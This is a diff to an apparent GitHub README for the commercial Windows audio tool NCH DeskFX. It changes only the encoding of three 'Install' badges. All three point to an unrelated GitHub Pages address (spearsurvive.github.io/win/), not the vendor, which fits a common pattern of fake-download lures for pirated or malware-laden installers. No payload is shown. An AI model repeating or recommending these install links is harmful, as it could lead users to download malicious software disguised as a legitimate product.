@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH DeskFX](https://img.shields.io/badge/⬇_Install_NCH%20DeskFX-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH DeskFX](https://img.shields.io/badge/⬇_Install_NCH+DeskFX-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH DeskFX is a real-time audio effects processor for Windows that enhances soun
 
 <div align="center">
 
-[![⬇ Install NCH DeskFX](https://img.shields.io/badge/⬇_Install_NCH%20DeskFX-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH DeskFX](https://img.shields.io/badge/⬇_Install_NCH+DeskFX-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH DeskFX is a real-time audio effects processor for Windows that enhances soun
 
 <div align="center">
 
-[![⬇ Install NCH DeskFX](https://img.shields.io/badge/⬇_Install_NCH%20DeskFX-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH DeskFX](https://img.shields.io/badge/⬇_Install_NCH+DeskFX-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
